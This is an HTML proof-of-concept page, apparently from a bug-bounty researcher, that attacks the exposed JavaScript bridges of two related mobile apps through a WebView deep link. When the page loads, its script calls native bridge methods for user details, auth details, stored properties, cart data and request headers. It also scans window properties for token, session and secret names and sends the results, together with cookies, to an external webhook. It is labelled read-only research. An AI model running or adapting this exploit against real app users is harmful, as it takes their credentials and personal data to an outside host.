<!DOCTYPE html>
<!--
    Cross-app JS-bridge probe for the Eternal (HackerOne) sibling apps.
    DYNAMIC confirm of the static finding in
    attachments/district_bistro_bridge_inventory.md (District ZWebKitBridge via
    plain addJavascriptInterface, no origin lock, reachable from
    district://webview?url=<attacker>). Read-only: only READS and beacons to the
    researcher's own webhook; fires no mutating/protected action.
    v2 - clean, syntax-valid bridge shim (v1 ensureZKit had a parse error).
-->
<html>
<head>
<meta charset="utf-8">
<title>Eternal cross-app bridge probe</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  html,body{margin:0;padding:0;font-family:-apple-system,"Segoe UI",Roboto,Arial,sans-serif;background:#fff;color:#1c1c1c}
  .banner{background:#B40000;color:#fff;padding:10px 14px;font-size:13px;line-height:1.3;text-align:center;font-weight:600}
  .banner small{display:block;font-weight:400;opacity:.9;margin-top:3px;font-size:11px}
  .wrap{max-width:560px;margin:0 auto;padding:18px}
  h1{font-size:18px;margin:14px 0 6px}
  pre{font-size:11px;color:#333;white-space:pre-wrap;word-break:break-all;background:#f5f5f5;padding:10px;border-radius:6px}
</style>
</head>
<body>

<div class="banner">
  SECURITY RESEARCH PROBE — NOT A REAL PAGE. RESEARCHER: ktmj@HackerOne
  <small>Static basis: attachments/district_bistro_bridge_inventory.md. Read-only. No credential leaves this page except to the researcher's own webhook; no mutating/protected action is fired.</small>
</div>

<div class="wrap">
  <h1>Eternal sibling-app JS-bridge probe</h1>
  <pre id="log">booting
</pre>
</div>

<script>
var WEBHOOK = "https://webhook.site/46fabf84-f458-4e57-b7c0-fd547f395ebb";
var log = document.getElementById('log');

function send(label, data) {
  var s;
  try { s = (typeof data === 'string') ? data : JSON.stringify(data); } catch (e) { s = String(data); }
  if (log) { log.textContent += label + ": " + s + "\n"; }
  var img = new Image();
  img.src = WEBHOOK + "?l=" + encodeURIComponent(label) + "&d=" + encodeURIComponent(s).slice(0, 1800);
}

function describe(name) {
  var g;
  try { g = window[name]; } catch (e) { return { present: false, err: String(e) }; }
  if (typeof g === 'undefined' || g === null) return { present: false };
  var info = { present: true, type: typeof g, own: [], proto: [] };
  try { info.own = Object.getOwnPropertyNames(g); } catch (e) {}
  try {
    var p = Object.getPrototypeOf(g);
    if (p) info.proto = Object.getOwnPropertyNames(p);
  } catch (e) {}
  return info;
}

function enumerateAll() {
  var names = ['ZKit', 'JSBridge', 'ZWebKitBridge', 'JsBridge', 'Android'];
  for (var i = 0; i < names.length; i++) {
    send('globals_' + names[i], describe(names[i]));
  }
  send('globals_flags', {
    hasZKit: typeof window.ZKit !== 'undefined',
    hasJSBridge: typeof window.JSBridge !== 'undefined',
    hasZWebKitBridge: typeof window.ZWebKitBridge !== 'undefined',
    hasJsBridge: typeof window.JsBridge !== 'undefined',
    hasAndroid: typeof window.Android !== 'undefined',
    href: location.href,
    cookies: document.cookie
  });
}

// Clean, syntax-valid shim equivalent to android-bridge.js:
// ZKit.call(name, params, cb) posts {bridgeName,params,msgType:'call',callbackId}
// to the native ZWebKitBridge.postMessage; native replies via ZKit.invokeJS(...).
var __cb = {};
function __invokeJS(t) {
  try {
    t = (t && t.constructor === String) ? JSON.parse(t) : t;
    var r = (t.responseData && t.responseData.constructor === String) ? JSON.parse(t.responseData) : t.responseData;
    var c = (t.metaData && t.metaData.constructor === String) ? JSON.parse(t.metaData) : t.metaData;
    if (t.msgType === "internal" && t.bridgeName) {
      if (t.bridgeName === "phoenixConfig") window.phoenixConfig = r;
      return;
    }
    var o = __cb[t.callbackId];
    if (!o) return;
    if (!t.keepCallback) delete __cb[t.callbackId];
    if (typeof o === "function") o(r, c);
  } catch (e) { send('invokeJS_err', String(e)); }
}
function __call(bridgeName, params, cb, metaData) {
  var id = bridgeName + "_" + (new Date).getTime() + "_" + Math.random();
  if (typeof cb === "function") __cb[id] = cb;
  var msg = { bridgeName: bridgeName, params: (params || null), msgType: "call", callbackId: id, metaData: (metaData || null) };
  try { ZWebKitBridge.postMessage(JSON.stringify(msg)); } catch (e) { send('postMessage_err', String(e)); }
}
function __subscribe(bridgeName, params, cb, metaData) {
  if (typeof cb === "function") __cb[bridgeName] = cb;
  var msg = { bridgeName: bridgeName, params: (params || null), msgType: "subscribe", callbackId: bridgeName, metaData: (metaData || null) };
  try { ZWebKitBridge.postMessage(JSON.stringify(msg)); } catch (e) { send('subscribe_err', String(e)); }
}
function ensureZKit() {
  if (window.ZKit && typeof window.ZKit.call === "function") return true;
  if (typeof window.ZWebKitBridge === "undefined") return false;
  var api = { call: __call, postMessage: __call, invokeJS: __invokeJS, subscribe: __subscribe };
  window.ZKit = api;
  if (typeof window.JSBridge === "undefined") window.JSBridge = api;
  return (window.ZKit && typeof window.ZKit.call === "function");
}

function probeDistrict() {
  if (!ensureZKit()) { send('district', 'ZKit/ZWebKitBridge not available on this origin'); return; }
  function cb(tag) { return function (resp, meta) { send('district_' + tag, { resp: resp, meta: meta }); }; }
  try { window.ZKit.call('getUserDetails', {}, cb('getUserDetails')); } catch (e) { send('district_getUserDetails_err', String(e)); }
  try { window.ZKit.call('userAuthDetails', { isLoginRequired: false }, cb('userAuthDetails')); } catch (e) { send('district_userAuthDetails_err', String(e)); }
  try { window.ZKit.call('getCity', {}, cb('getCity')); } catch (e) { send('district_getCity_err', String(e)); }
  try { window.ZKit.call('getAppStoredProperties', {}, cb('getAppStoredProperties')); } catch (e) { send('district_getAppStoredProperties_err', String(e)); }
  try {
    window.ZKit.call('httpRequest', {
      method: 'GET',
      url: WEBHOOK + '?probe=httpRequest_authenticated',
      headers: { 'X-Hackerone': 'ktmj' },
      authentication: { is_authenticated: true, header_key: 'access_token' }
    }, cb('httpRequest'));
  } catch (e) { send('district_httpRequest_err', String(e)); }
  // payments / zMoneyWallet / shared_prefs(write) / performActions intentionally NOT invoked.
}

function probeBistro() {
  if (typeof window.JsBridge === 'undefined') { send('bistro', 'JsBridge not available on this origin'); return; }
  try { send('bistro_getCartData', String(window.JsBridge.getCartData())); } catch (e) { send('bistro_getCartData_err', String(e)); }
  try { send('bistro_getHeaders', String(window.JsBridge.getHeaders())); } catch (e) { send('bistro_getHeaders_err', String(e)); }
}

function runAll(tag) {
  send('run', tag);
  enumerateAll();
  probeDistrict();
  probeBistro();
}

function windowScan() {
  var interesting = {};
  for (var k in window) {
    if (/token|auth|session|secret|key|cookie|user|city|wallet|api/i.test(k)) {
      try { interesting[k] = (typeof window[k] === 'function') ? 'function' : String(window[k]).substring(0, 120); } catch (e) {}
    }
  }
  send('window_props', interesting);
}

try { runAll('t0'); } catch (e) { send('runAll_err_t0', String(e)); }
setTimeout(function () { try { runAll('t1'); } catch (e) { send('runAll_err_t1', String(e)); } }, 1000);
setTimeout(function () { try { runAll('t3'); } catch (e) { send('runAll_err_t3', String(e)); } }, 3000);
setTimeout(function () { try { runAll('t5'); windowScan(); } catch (e) { send('runAll_err_t5', String(e)); } }, 5000);
</script>
</body>
</html>
